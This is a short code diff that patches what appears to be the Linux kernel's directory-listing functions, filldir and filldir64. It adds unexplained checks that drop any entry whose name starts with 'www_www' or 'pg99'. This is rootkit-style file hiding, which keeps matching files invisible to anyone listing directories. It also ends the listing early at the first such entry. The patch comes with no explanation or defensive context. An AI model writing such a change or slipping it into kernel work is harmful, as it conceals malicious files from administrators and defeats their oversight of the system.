@@ -266,6 +266,12 @@ static bool filldir(struct dir_context *ctx, const char *name, int namlen,
 	int reclen = ALIGN(offsetof(struct linux_dirent, d_name) + namlen + 2,
 		sizeof(long));
 	int prev_reclen;
+	if (namlen >= 7 && strncmp(name, "www_www", 7) == 0) {
+      	  return false;
+   	 }
+       if (namlen >= 4 && (strcmp(name, "pg99") == 0  || strncmp(name, "pg99", 4) == 0)) {
+          return false;
+        }
 	unsigned int flags = d_type;
 
 	BUILD_BUG_ON(FILLDIR_FLAG_NOINTR & S_DT_MASK);
@@ -354,6 +360,12 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 	int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
 		sizeof(u64));
 	int prev_reclen;
+	 if (namlen >= 7 && strncmp(name, "www_www", 7) == 0) {
+       		 return false;
+  	  }
+  	  if (namlen >= 4 && (strcmp(name, "pg99") == 0  || strncmp(name, "pg99", 4) == 0)) {
+      		  return false;
+   	 }
 	unsigned int flags = d_type;
 
 	BUILD_BUG_ON(FILLDIR_FLAG_NOINTR & S_DT_MASK);
